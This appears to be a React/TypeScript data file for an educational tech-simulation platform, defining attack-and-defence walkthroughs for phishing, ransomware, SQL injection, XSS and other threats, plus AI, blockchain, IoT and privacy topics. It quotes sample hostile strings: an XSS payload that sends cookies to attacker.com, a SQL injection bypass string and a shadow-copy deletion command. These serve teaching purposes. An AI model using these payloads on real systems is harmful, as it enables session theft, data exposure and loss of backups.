import React, { useState, useEffect } from 'react';
import {
  Shield,
  X,
  Play,
  Pause,
  RotateCcw,
  ChevronLeft,
  ChevronRight,
  Zap,
  Lock,
  Hash,
  Award,
  CheckCircle2,
  LogOut,
  Terminal,
} from 'lucide-react';
import { WorkableSandboxLab } from './WorkableSandboxLab';

export interface SimulationItem {
  id: string;
  name: string;
  subtitle: string;
  category: string;
  status: 'ATTACK_IN_PROGRESS' | 'SIMULATION_ACTIVE' | 'DEFENSE_ACTIVE';
  totalSteps: number;
  steps: {
    stepNumber: number;
    tag: string;
    description: string;
  }[];
  simplified: string;
  defenseProtocols: {
    title: string;
    description: string;
  }[];
  didYouKnow: string;
}

// 11 Core Cybersecurity Threats & Simulations (Exact match to reference Image 2)
export const CYBER_SIMULATIONS: SimulationItem[] = [
  {
    id: 'phishing',
    name: 'Phishing',
    subtitle: 'A fake message that tricks people into giving passwords or clicking bad links.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'EMAIL-ARRIVES',
        description: 'An attacker dispatches a deceptive email spoofing a legitimate bank or school authority.',
      },
      {
        stepNumber: 2,
        tag: 'LINK-CLICKED',
        description: 'The recipient clicks an urgent call-to-action link pointing to an imposter login clone.',
      },
      {
        stepNumber: 3,
        tag: 'CREDENTIALS-HARVESTED',
        description: 'The victim inputs their username and password; the fake portal logs secrets to the attacker server.',
      },
      {
        stepNumber: 4,
        tag: 'DEFENSE-ACTIVATED',
        description: 'Domain verification, DMARC/DKIM email inspection, and 2FA hardware tokens block credential reuse.',
      },
    ],
    simplified: 'Think of phishing like someone wearing a fake delivery uniform to trick you into opening the front door and handing over your house keys.',
    defenseProtocols: [
      {
        title: 'CHECK THE SENDER',
        description: 'Always inspect the full email domain, not just the display name (e.g., support@bank.com vs support@b-ank.com).',
      },
      {
        title: "HOVER, DON'T CLICK",
        description: 'Move your cursor over hyperlinks to preview the real destination URL before committing to a click.',
      },
      {
        title: 'ENFORCE 2FA / PASSKEYS',
        description: 'Two-Factor Authentication and FIDO2 passkeys render harvested passwords useless without physical tokens.',
      },
    ],
    didYouKnow: "The term 'phishing' was coined in the mid-1990s on AOL as a play on 'fishing', referencing attackers using email bait to hook user credentials.",
  },
  {
    id: 'malware',
    name: 'Malware (Viruses / Worms)',
    subtitle: 'Malicious code designed to damage systems, replicate autonomously, or steal private assets.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'CARRIER-DELIVERY',
        description: 'Malware arrives packaged inside an untrusted download, infected USB drive, or weaponized macro.',
      },
      {
        stepNumber: 2,
        tag: 'BINARY-EXECUTION',
        description: 'The victim executes the payload, granting the process background system privileges.',
      },
      {
        stepNumber: 3,
        tag: 'AUTONOMOUS-SPREAD',
        description: 'The worm scans local subnet broadcast addresses and infects unpatched neighboring machines.',
      },
      {
        stepNumber: 4,
        tag: 'SANDBOX-QUARANTINE',
        description: 'EDR memory monitoring and process sandboxes detect anomalous signatures and isolate the process.',
      },
    ],
    simplified: 'Malware is like a biological virus that enters through an open window and silently duplicates itself onto every surface in the building.',
    defenseProtocols: [
      {
        title: 'RUN SYSTEM UPDATES',
        description: 'Patch known operating system and browser CVE vulnerabilities before exploit kits can leverage them.',
      },
      {
        title: 'PRINCIPLE OF LEAST PRIVILEGE',
        description: 'Operate everyday desktop accounts without local administrator or root permissions.',
      },
      {
        title: 'EXECUTION RESTRICTIONS',
        description: 'Enforce application allow-listing and block untrusted binary execution from temporary directories.',
      },
    ],
    didYouKnow: "The Creeper worm, created in 1971 on ARPANET, is widely considered the world's first computer worm, displaying: 'I'm the creeper, catch me if you can!'",
  },
  {
    id: 'ransomware',
    name: 'Ransomware',
    subtitle: 'Cryptographic malware that locks personal or enterprise files until an extortion fee is paid.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'INITIAL-INTRUSION',
        description: 'Attackers breach an exposed RDP port or compromised employee credential.',
      },
      {
        stepNumber: 2,
        tag: 'SHADOW-COPY-PURGE',
        description: 'The ransomware script terminates shadow backup processes (`vssadmin delete shadows`).',
      },
      {
        stepNumber: 3,
        tag: 'AES-ENCRYPTION-SWEEP',
        description: 'Documents, databases, and configuration files are encrypted with symmetric keys locked by RSA public key.',
      },
      {
        stepNumber: 4,
        tag: 'IMMUTABLE-RESTORE',
        description: 'Air-gapped, immutable Cloud storage backups allow complete operational recovery without paying extortion.',
      },
    ],
    simplified: 'Imagine a burglar breaking in, putting heavy combination locks on all your filing cabinets, and demanding money for the codes.',
    defenseProtocols: [
      {
        title: '3-2-1 BACKUP RULE',
        description: 'Maintain 3 copies of data on 2 different media types, with 1 copy completely offsite and air-gapped.',
      },
      {
        title: 'NETWORK SEGMENTATION',
        description: 'Isolate critical database nodes from general classroom and employee Wi-Fi subnets.',
      },
      {
        title: 'NEVER PAY RANSOM',
        description: 'Payment funds criminal syndicates and provides zero technical guarantee that decryption keys will function.',
      },
    ],
    didYouKnow: 'The WannaCry outbreak in 2017 infected over 200,000 computers across 150 nations in less than 24 hours before a 22-year-old researcher found its kill-switch domain.',
  },
  {
    id: 'ddos',
    name: 'Denial of Service (DDoS)',
    subtitle: 'Flooding an online service with overwhelming traffic bursts so legitimate users cannot access it.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'BOTNET-RECRUITMENT',
        description: 'Thousands of compromised IoT cameras, routers, and servers are assembled into a command-and-control botnet.',
      },
      {
        stepNumber: 2,
        tag: 'SYN-FLOOD-DISPATCH',
        description: 'The botnet initiates millions of concurrent TCP SYN packets directed at the target web server.',
      },
      {
        stepNumber: 3,
        tag: 'RESOURCE-EXHAUSTION',
        description: 'The server connection backlog table fills completely, causing genuine requests to time out.',
      },
      {
        stepNumber: 4,
        tag: 'ANYCAST-SCRUBBING',
        description: 'Cloudflare Anycast edge filters absorb volumetric traffic bursts and route only clean HTTP requests.',
      },
    ],
    simplified: 'Like 5,000 people rushing into a small store door at the exact same second, blocking genuine customers from entering.',
    defenseProtocols: [
      {
        title: 'ANYCAST CDN SHIELDING',
        description: 'Hide origin IP addresses behind global CDN edge reverse proxies like Cloudflare or Fastly.',
      },
      {
        title: 'RATE LIMITING AT EDGE',
        description: 'Cap incoming requests per IP (e.g. 60 requests/minute) to blunt automated layer-7 query floods.',
      },
      {
        title: 'SYN COOKIES & WAF RULES',
        description: 'Enable SYN cookie packet validation at the Linux kernel level to prevent connection table exhaustion.',
      },
    ],
    didYouKnow: 'The largest recorded volumetric DDoS attack in history surpassed 3.8 terabits per second, generating billions of requests per second against edge servers.',
  },
  {
    id: 'mitm',
    name: 'Man-in-the-Middle (MitM)',
    subtitle: 'An eavesdropper secretly intercepts and alters communications between two trusting parties.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'ARP-SPOOFING',
        description: 'Attacker broadcasts forged ARP replies on an unencrypted public Wi-Fi network to poison router caches.',
      },
      {
        stepNumber: 2,
        tag: 'TRAFFIC-RELAY',
        description: 'Packets intended for the internet gateway are routed through the attacker machine first.',
      },
      {
        stepNumber: 3,
        tag: 'PLAINTEXT-INSPECTION',
        description: 'Unencrypted HTTP sessions expose cookies, session tokens, and passwords in cleartext transmission.',
      },
      {
        stepNumber: 4,
        tag: 'TLS-ENCRYPTION-SHIELD',
        description: 'Strict HTTPS, HSTS, and TLS 1.3 certificate pinning prevent eavesdropping even on hostile networks.',
      },
    ],
    simplified: 'Like an imposter postman opening your letters, reading private notes, rewriting sentences, and sealing the envelope back up before delivery.',
    defenseProtocols: [
      {
        title: 'ALWAYS USE HTTPS',
        description: 'Ensure websites enforce TLS 1.3 and HSTS (`Strict-Transport-Security: max-age=31536000`).',
      },
      {
        title: 'AVOID UNTRUSTED WI-FI',
        description: 'Use encrypted cellular data or trusted WireGuard VPN tunnels when connecting on public hotel/airport networks.',
      },
      {
        title: 'CERTIFICATE PINNING',
        description: 'Mobile applications should pin authoritative server public keys to reject forged root CA intercepts.',
      },
    ],
    didYouKnow: 'Before HTTPS was universally adopted in the 2010s, a browser extension called Firesheep allowed anyone on an open Wi-Fi network to hijack neighboring Facebook sessions with one click.',
  },
  {
    id: 'sql_injection',
    name: 'SQL Injection',
    subtitle: 'Injecting hostile SQL syntax through user inputs to manipulate relational database queries.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'INPUT-PROBE',
        description: 'An attacker submits special characters like `\' OR \'1\'=\'1` into a vulnerable search or login form.',
      },
      {
        stepNumber: 2,
        tag: 'SYNTAX-CONTAMINATION',
        description: 'The backend string concatenates input: `SELECT * FROM users WHERE user = \'\' OR \'1\'=\'1\'`.',
      },
      {
        stepNumber: 3,
        tag: 'LOGIC-BYPASS',
        description: 'The condition evaluates to TRUE for all rows, leaking entire student and staff database records.',
      },
      {
        stepNumber: 4,
        tag: 'PARAMETER-BINDING',
        description: 'Using `?` parameter placeholders treats input strictly as literal data, completely neutralizing injection.',
      },
    ],
    simplified: 'Like filling out an official form where you write your name as "John; Also give John all the bank money", and the clerk foolishly follows both instructions.',
    defenseProtocols: [
      {
        title: 'ALWAYS PARAMETERIZE',
        description: 'Never concatenate SQL strings with user input; compile SQL queries ahead of time and bind inputs safely.',
      },
      {
        title: 'RESTRICT DB PERMISSIONS',
        description: 'Grant application DB users only necessary table rights; revoke access to `information_schema` and DDL.',
      },
      {
        title: 'USE ORM / QUERY BUILDERS',
        description: 'Leverage Prisma, Kysely, or raw prepared statements with positional arguments (`$1`, `?`).',
      },
    ],
    didYouKnow: 'SQL injection was first documented in 1998 by security researcher Rain Forest Puppy in Phrack Magazine and remains on the OWASP Top 10 over 25 years later.',
  },
  {
    id: 'xss',
    name: 'Cross-site Scripting (XSS)',
    subtitle: 'Injecting malicious JavaScript into trusted websites that executes in other users\' browsers.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'PAYLOAD-POSTED',
        description: 'Attacker posts a comment containing `<script>fetch("attacker.com?c="+document.cookie)</script>`.',
      },
      {
        stepNumber: 2,
        tag: 'UNESCAPED-RENDER',
        description: 'A victim visits the discussion board, and the backend renders the unescaped script string directly in the DOM.',
      },
      {
        stepNumber: 3,
        tag: 'SESSION-EXFILTRATION',
        description: 'The script executes with the victim\'s full session authority, sending private auth tokens to the attacker.',
      },
      {
        stepNumber: 4,
        tag: 'CSP-AND-ENCODING',
        description: 'HTML entity encoding and strict Content Security Policy (`script-src \'self\'`) block unauthorized script execution.',
      },
    ],
    simplified: 'Like slipping an invisible micro-recorder into someone\'s book so when they open it, the book secretly reads aloud their secrets to a listener.',
    defenseProtocols: [
      {
        title: 'HTML ENTITY ENCODING',
        description: 'Escape characters (`<`, `>`, `&`, `"`, `\'`) before rendering untrusted input into HTML contexts.',
      },
      {
        title: 'HTTP-ONLY COOKIES',
        description: 'Store authentication session tokens in `HttpOnly` cookies so JavaScript cannot read `document.cookie`.',
      },
      {
        title: 'CONTENT SECURITY POLICY',
        description: 'Define strict HTTP `Content-Security-Policy` headers restricting where scripts can load and execute from.',
      },
    ],
    didYouKnow: 'In 2005, the Samy worm exploited an XSS vulnerability on MySpace to add Samy as a friend and propagate automatically, infecting over 1,000,000 users in under 20 hours.',
  },
  {
    id: 'password_attacks',
    name: 'Password Attacks',
    subtitle: 'Automated brute-forcing, dictionary guessing, and credential stuffing using leaked databases.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'COMBO-LIST-LOAD',
        description: 'Attackers acquire billions of credentials leaked from past third-party corporate data breaches.',
      },
      {
        stepNumber: 2,
        tag: 'AUTOMATED-SPRAYING',
        description: 'Headless bots test username-password pairs across thousands of school and banking portals.',
      },
      {
        stepNumber: 3,
        tag: 'ACCOUNT-TAKEOVER',
        description: 'Users who reused the same password across multiple websites suffer account compromise.',
      },
      {
        stepNumber: 4,
        tag: 'RATE-LIMIT-AND-PASSKEYS',
        description: 'Account lockouts, Argon2id slow hashing, and cryptographic passkeys neutralize dictionary attacks.',
      },
    ],
    simplified: 'Like someone having a giant ring of 10,000 stolen keys and walking down a hotel hallway trying each key in every single door.',
    defenseProtocols: [
      {
        title: 'USE A PASSWORD MANAGER',
        description: 'Generate unique, high-entropy 16+ character passwords for every digital service without memorization strain.',
      },
      {
        title: 'RATE LIMIT AUTH ATTEMPTS',
        description: 'Lock accounts after 5 failed attempts and require exponential backoff (1s, 2s, 4s, 8s).',
      },
      {
        title: 'MODERN PASSKEY ADOPTION',
        description: 'Replace shared secret passwords with asymmetric FIDO2 WebAuthn passkeys backed by biometric hardware.',
      },
    ],
    didYouKnow: "Over 80% of data breaches involve stolen or weak credentials, with '123456' and 'password' still ranking among the most used passwords globally.",
  },
  {
    id: 'spyware',
    name: 'Spyware & Keyloggers',
    subtitle: 'Silent software that records keystrokes, webcam feeds, and screen captures without authorization.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'STEALTH-INSTALLATION',
        description: 'Spyware bundles inside a downloaded free utility or pirated multimedia software package.',
      },
      {
        stepNumber: 2,
        tag: 'KEYSTROKE-HOOKING',
        description: 'The background thread hooks OS input handlers (`SetWindowsHookEx`), recording every keypress.',
      },
      {
        stepNumber: 3,
        tag: 'COVERT-EXFILTRATION',
        description: 'Encrypted keystroke logs and screenshot captures are dispatched periodically to remote C2 servers.',
      },
      {
        stepNumber: 4,
        tag: 'BEHAVIORAL-DETECTION',
        description: 'OS kernel telemetry and privacy indicators alert users whenever the webcam, mic, or input hooks engage.',
      },
    ],
    simplified: 'Like an invisible spy standing over your shoulder taking photos of everything you write and typing it into a second notebook.',
    defenseProtocols: [
      {
        title: 'VERIFY SOFTWARE PROVENANCE',
        description: 'Only download applications from verified vendors and signed package repositories.',
      },
      {
        title: 'CHECK STARTUP PROGRAMS',
        description: 'Audit scheduled tasks, registry Run keys, and background daemons for unauthorized persistent binaries.',
      },
      {
        title: 'HARDWARE PRIVACY INDICATORS',
        description: 'Use physical webcam covers and monitor hardware microphone LEDs for unprompted activity.',
      },
    ],
    didYouKnow: 'Commercial spyware tools like Pegasus can exploit zero-click vulnerabilities in messaging apps, compromising smartphones without any victim interaction.',
  },
  {
    id: 'trojan',
    name: 'Trojan Horse',
    subtitle: 'A program that masquerades as legitimate software while carrying concealed malicious capabilities.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'BENIGN-DISGUISE',
        description: 'The malware presents itself as a harmless video game mod, PDF viewer, or system optimization utility.',
      },
      {
        stepNumber: 2,
        tag: 'DECEPTIVE-INSTALL',
        description: 'The user willingly grants administrator permission to run what looks like a genuine setup installer.',
      },
      {
        stepNumber: 3,
        tag: 'BACKDOOR-OPENED',
        description: 'While performing the advertised task, a hidden secondary thread opens a reverse TCP shell to the attacker.',
      },
      {
        stepNumber: 4,
        tag: 'CRYPTOGRAPHIC-SIGNATURES',
        description: 'Code-signing validation and certificate authority revocation prevent forged binaries from launching.',
      },
    ],
    simplified: 'Directly inspired by the ancient Trojan Horse myth: a hollow wooden horse presented as a gift that concealed an army inside.',
    defenseProtocols: [
      {
        title: 'CHECK CODE SIGNATURES',
        description: 'Ensure Windows SmartScreen or macOS Gatekeeper confirms the binary was signed by a registered developer.',
      },
      {
        title: 'VERIFY SHA-256 HASHES',
        description: 'Compare downloaded installer checksums against the vendor\'s official published cryptographic hashes.',
      },
      {
        title: 'USE ISOLATED CONTAINERS',
        description: 'Test unknown utilities in temporary throwaway virtual machines or sandboxed Docker containers.',
      },
    ],
    didYouKnow: 'The original Trojan Horse story comes from Homer\'s Odyssey, where Greek soldiers hid inside a giant wooden horse to breach the fortified walls of Troy.',
  },
  {
    id: 'adware',
    name: 'Adware & Malvertising',
    subtitle: 'Intrusive software that hijacks browser settings and injects aggressive or dangerous advertisements.',
    category: 'CYBER_SECURITY',
    status: 'ATTACK_IN_PROGRESS',
    totalSteps: 4,
    steps: [
      {
        stepNumber: 1,
        tag: 'EXTENSION-HIJACK',
        description: 'A rogue browser extension requests permission to "read and change all your data on websites you visit".',
      },
      {
        stepNumber: 2,
        tag: 'DNS-AND-HOMEPAGE-TAMPER',
        description: 'The extension redirects search queries and changes the default browser start page to an ad network.',
      },
      {
        stepNumber: 3,
        tag: 'AGGRESSIVE-INJECTION',
        description: 'Pop-ups and fake tech-support scareware banners overlay legitimate educational content.',
      },
      {
        stepNumber: 4,
        tag: 'ZERO-AD-TRACKER-POLICIES',
        description: 'Geniusphere\'s strict zero-tracker policy and browser extension audits guarantee a clean learning environment.',
      },
    ],
    simplified: 'Like hiring a tutor who interrupts your homework every 30 seconds to yell advertisements through a megaphone.',
    defenseProtocols: [
      {
        title: 'MINIMIZE EXTENSIONS',
        description: 'Audit browser extensions monthly; remove any unneeded add-ons with broad permissions.',
      },
      {
        title: 'USE DNS-LEVEL SINKHOLING',
        description: 'Configure Pi-hole or NextDNS to block malicious telemetry and advertising networks before reaching devices.',
      },
      {
        title: 'NEVER CALL POPUP NUMBERS',
        description: 'Browser pop-ups claiming your computer has 50 viruses and providing a phone number are 100% fraudulent.',
      },
    ],
    didYouKnow: "Under Section 9(3) of India's DPDP Act 2023, targeted advertising and tracking directed at minors in educational platforms is strictly prohibited by law.",
  },
];

// 2. Artificial Intelligence & Machine Learning Pack
export const AI_SIMULATIONS: SimulationItem[] = [
  {
    id: 'ai-nn-backprop',
    name: 'Neural Network Backpropagation',
    subtitle: 'How error gradients backpropagate through layer weights to minimize prediction loss.',
    category: 'AI_AND_ML',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'FORWARD-PASS', description: 'Feature embeddings multiply weight matrices across hidden layers with activation functions.' },
      { stepNumber: 2, tag: 'LOSS-EVALUATION', description: 'Cross-entropy loss computes the mathematical delta between model logits and ground-truth labels.' },
      { stepNumber: 3, tag: 'GRADIENT-CALC', description: 'Chain rule backpropagates partial derivatives (dL/dW) backwards through each layer node.' },
      { stepNumber: 4, tag: 'WEIGHT-UPDATE', description: 'The Adam optimizer updates tensor weights proportionally to learning rate (W = W - lr * dL/dW).' },
    ],
    simplified: 'Like taking a practice exam, checking which questions you got wrong, and revising specifically those chapters before the real exam.',
    defenseProtocols: [
      { title: 'LEARNING RATE SCHEDULING', description: 'Decay the learning rate over time to prevent oscillation around local error minima.' },
      { title: 'GRADIENT CLIPPING', description: 'Cap maximum gradient norms to prevent exploding gradients from destabilizing training.' },
      { title: 'DROPOUT REGULARIZATION', description: 'Randomly deactivate 20-50% of hidden neurons during training to stop over-memorization.' },
    ],
    didYouKnow: 'The backpropagation algorithm was popularized by Rumelhart, Hinton, and Williams in 1986, establishing the foundation of modern deep learning.',
  },
  {
    id: 'ai-llm-attention',
    name: 'Transformer Self-Attention',
    subtitle: 'How query, key, and value vectors calculate contextual token relevance scores.',
    category: 'AI_AND_ML',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'QKV-PROJECTION', description: 'Input token vectors project into Query, Key, and Value matrices through learned linear layers.' },
      { stepNumber: 2, tag: 'SCALED-DOT-PRODUCT', description: 'Dot product between Query and Key divided by sqrt(d_k) measures inter-token relevance.' },
      { stepNumber: 3, tag: 'SOFTMAX-NORMALIZATION', description: 'Softmax transforms attention logits into normalized probability distributions summing to 1.0.' },
      { stepNumber: 4, tag: 'CONTEXT-SYNTHESIS', description: 'Values are multiplied by attention probabilities and projected into output token representations.' },
    ],
    simplified: 'When reading a sentence, your brain pays attention to the relationship between the subject and verb to comprehend context.',
    defenseProtocols: [
      { title: 'CONTEXT ATTENTION MASKING', description: 'Use causal attention masks to prevent earlier tokens from cheating and looking ahead at future tokens.' },
      { title: 'TEMPERATURE SAMPLING CONSTRAINTS', description: 'Keep temperature <= 0.2 for deterministic code/math and ~0.7 for creative generation.' },
      { title: 'DELIMITER ISOLATION', description: 'Enforce clear XML delimiters (<user_input>) to prevent prompt injection hijacking.' },
    ],
    didYouKnow: 'The landmark 2017 Google paper "Attention Is All You Need" introduced transformers, completely replacing older recurrent architectures.',
  },
  {
    id: 'ai-bias-fairness',
    name: 'Algorithmic Bias & Fair Credit Evaluation',
    subtitle: 'Auditing demographic parity and equalized odds in automated decision systems.',
    category: 'AI_AND_ML',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'FEATURE-CORRELATION', description: 'Audit training data for proxy variables (like zip codes) that encode protected demographic attributes.' },
      { stepNumber: 2, tag: 'DISPARATE-IMPACT-AUDIT', description: 'Measure false negative rejection rates across demographic subgroups to detect systemic skew.' },
      { stepNumber: 3, tag: 'COHORT-REWEIGHTING', description: 'Apply cost-sensitive sample reweighting to equalize the decision boundary threshold across cohorts.' },
      { stepNumber: 4, tag: 'FAIR-INFERENCE-VERIFICATION', description: 'Confirm disparate impact ratio strictly exceeds the legal 80% four-fifths rule threshold.' },
    ],
    simplified: 'Ensuring an automated loan evaluation algorithm judges financial capability objectively rather than historical postal code biases.',
    defenseProtocols: [
      { title: 'PURGE PROXY ATTRIBUTES', description: 'Remove historical postal and school codes that covertly mirror demographic variables.' },
      { title: 'EQUALIZED ODDS BENCHMARK', description: 'Verify that true positive rates remain equal across all protected applicant cohorts.' },
      { title: 'CONTINUOUS DRIFT AUDITING', description: 'Execute weekly automated bias audits on live production model inferences.' },
    ],
    didYouKnow: 'The "four-fifths rule" was established in 1978 by the US Equal Employment Opportunity Commission and is now globally used in algorithmic fairness audits.',
  },
];

// 3. Blockchain & Cryptography Pack
export const BLOCKCHAIN_SIMULATIONS: SimulationItem[] = [
  {
    id: 'bc-pow-mining',
    name: 'Proof-of-Work SHA-256 Mining',
    subtitle: 'Iterating cryptographic nonces until the double-SHA-256 block hash meets difficulty zeros.',
    category: 'BLOCKCHAIN',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'HEADER-SERIALIZE', description: 'Serialize previous block hash, Merkle root, timestamp, and initialize nonce counter to 0.' },
      { stepNumber: 2, tag: 'DOUBLE-SHA256', description: 'Calculate SHA256(SHA256(BlockHeaderBytes)) using cryptographic hardware accelerators.' },
      { stepNumber: 3, tag: 'DIFFICULTY-CHECK', description: 'Evaluate if hash integer is below target threshold (e.g. starts with required leading zeros).' },
      { stepNumber: 4, tag: 'BROADCAST-LEDGER', description: 'Winning nonce and proof are broadcast to peer nodes, who verify in O(1) and commit the block.' },
    ],
    simplified: 'Like rolling a billion-sided cryptographic die over and over until you roll a number starting with four zeros.',
    defenseProtocols: [
      { title: '51% ATTACK RESISTANCE', description: 'Maintain distributed computational hash rate so no single actor can rewrite historical blocks.' },
      { title: 'DIFFICULTY ADJUSTMENT', description: 'Automatically recalibrate mining difficulty every 2,016 blocks to enforce predictable block times.' },
      { title: 'MERKLE PROOF AUDITING', description: 'Verify any single transaction in O(log n) without downloading entire gigabyte ledgers.' },
    ],
    didYouKnow: 'The Bitcoin network calculates more than 600 exahashes per second, making it the most powerful distributed computing system on Earth.',
  },
  {
    id: 'bc-consensus',
    name: 'Distributed Ledger 4-Node Consensus',
    subtitle: 'How decentralized peer nodes resolve state conflicts and temporary forks.',
    category: 'BLOCKCHAIN',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'TRANSACTION-GOSSIP', description: 'Unconfirmed transactions propagate through peer-to-peer gossip protocol across all 4 nodes.' },
      { stepNumber: 2, tag: 'COMPETING-BLOCK-PROPOSAL', description: 'Two geographically separated miners propose valid blocks at the identical height simultaneously.' },
      { stepNumber: 3, tag: 'TEMPORARY-FORK', description: 'Node network temporarily splits, each tracking their local chain branch awaiting confirmation.' },
      { stepNumber: 4, tag: 'LONGEST-CHAIN-CONVERGENCE', description: 'Next mined block extends one branch; all nodes adopt the chain with greatest accumulated proof-of-work.' },
    ],
    simplified: 'Like four accountants in different offices agreeing on the exact account balance without needing a central head-office manager.',
    defenseProtocols: [
      { title: 'SYBIL ATTACK DEFENSE', description: 'Require verifiable cryptographic proof-of-work to make creating fake identities economically useless.' },
      { title: 'CHECKPOINT COMMITS', description: 'Hardcode deep periodic block checkpoints to prevent historic reorganization attacks.' },
      { title: 'PEER GOSSIP REPUTATION', description: 'Drop and ban IP addresses of peer nodes that broadcast invalid transaction signatures.' },
    ],
    didYouKnow: 'Satoshi Nakamoto solved the decades-old Byzantine Generals Problem in 2008 by pairing proof-of-work with peer-to-peer gossip networks.',
  },
];

// 4. Internet of Things (IoT) Pack
export const IOT_SIMULATIONS: SimulationItem[] = [
  {
    id: 'iot-telemetry-mqtt',
    name: 'IoT Telemetry & MQTT Broker',
    subtitle: 'Sampling analog sensor metrics and routing lightweight telemetry to edge actuators.',
    category: 'IOT',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'ADC-SAMPLING', description: 'Microcontroller ADC samples analog voltage pins and converts readings to engineering metrics.' },
      { stepNumber: 2, tag: 'JSON-SERIALIZATION', description: 'Metric payload (Temp: 28°C, Humidity: 45%) is serialized into compact JSON packets.' },
      { stepNumber: 3, tag: 'MQTTS-PUBLISH', description: 'Edge device publishes packet over TLS 1.3 to topic `/sensors/telemetry/classroom-1`.' },
      { stepNumber: 4, tag: 'ACTUATOR-ENGAGEMENT', description: 'Subscribed edge controller evaluates threshold rules and clicks cooling fan relay to active state.' },
    ],
    simplified: 'A smart thermometer constantly measures room heat and automatically turns on the cooling fan when it gets too hot.',
    defenseProtocols: [
      { title: 'MQTTS TLS 1.3', description: 'Wrap all broker communication in TLS certificates to eliminate plaintext packet eavesdropping on campus Wi-Fi.' },
      { title: 'HARDWARE CRYPTO ELEMENT', description: 'Store MQTT device client certificates inside a dedicated cryptographic element (e.g. ATECC608A).' },
      { title: 'LOCAL FAILSAFE RULES', description: 'Keep critical thermal shutdown logic directly on the edge microcontroller if Wi-Fi goes down.' },
    ],
    didYouKnow: 'MQTT was originally invented in 1999 by Andy Stanford-Clark to monitor oil pipelines across the desert over low-bandwidth satellite links.',
  },
];

// 5. Microsoft Technologies Pack
export const MICROSOFT_SIMULATIONS: SimulationItem[] = [
  {
    id: 'ms-entra-rbac',
    name: 'Microsoft Entra ID OAuth2 Token Flow',
    subtitle: 'Validating cryptographic JWT bearer claims, tenant scopes, and RBAC authorization.',
    category: 'MICROSOFT',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'CHALLENGE-REQUEST', description: 'Client issues authorization challenge requesting hardware FIDO2 / Authenticator MFA.' },
      { stepNumber: 2, tag: 'JWT-TOKEN-ISSUANCE', description: 'Entra ID signs RSA-256 JWT access token containing tenant ID, roles, and expiry timestamp.' },
      { stepNumber: 3, tag: 'BEARER-CLAIM-AUDIT', description: 'Resource server extracts Authorization header and validates cryptographic signature against public keys.' },
      { stepNumber: 4, tag: 'RBAC-ACCESS-GRANT', description: 'Role-based access control engine permits scoped API operation to authorized institution resource.' },
    ],
    simplified: 'Like showing a digital, unforgeable government passport that proves who you are and which gates you are allowed to enter.',
    defenseProtocols: [
      { title: 'SHORT TOKEN LIFETIMES', description: 'Enforce access token validity to 15-60 minutes and rotate refresh tokens continuously.' },
      { title: 'CONDITIONAL ACCESS POLICIES', description: 'Require compliant, encrypted devices and trusted IP boundaries for administrative roles.' },
      { title: 'STRICT AUDIENCE CHECKS', description: 'Always validate both `iss` (issuer) and `aud` (audience) claims to prevent token forwarding exploits.' },
    ],
    didYouKnow: 'Microsoft Entra ID processes more than 30 billion authentications every day across enterprise and educational tenants worldwide.',
  },
];

// 6. Digital Privacy Pack
export const PRIVACY_SIMULATIONS: SimulationItem[] = [
  {
    id: 'priv-fingerprint-shield',
    name: 'Browser Fingerprint & Privacy Shield',
    subtitle: 'Deconstructing canvas rasterization drift and deploying privacy defense shields.',
    category: 'PRIVACY',
    status: 'SIMULATION_ACTIVE',
    totalSteps: 4,
    steps: [
      { stepNumber: 1, tag: 'CANVAS-PROBE', description: 'Third-party tracking script draws hidden 2D gradient text to a background HTML5 canvas.' },
      { stepNumber: 2, tag: 'GPU-ENTROPY-HARVEST', description: 'Microscopic GPU and driver rendering variances generate a unique, persistent hardware hash.' },
      { stepNumber: 3, tag: 'CROSS-SITE-LINKING', description: 'Data brokers link the canvas hash to IP and screen resolution to track browsing across sites.' },
      { stepNumber: 4, tag: 'DPDP-SHIELD-ENGAGED', description: 'Privacy shield injects subtle pseudo-random canvas noise, reducing uniqueness score to anonymous levels.' },
    ],
    simplified: 'Like noticing someone recognizes you by your unique shoe tread marks in the mud, and putting smooth slip-on covers over your shoes so you leave no trail.',
    defenseProtocols: [
      { title: 'CANVAS NOISE INJECTION', description: 'Alter 1-2 random pixel RGB values during canvas readback to destroy deterministic hash identity.' },
      { title: 'WEBRTC STUN SHIELD', description: 'Disable WebRTC local IP enumeration to stop scripts from learning your internal private Wi-Fi IP.' },
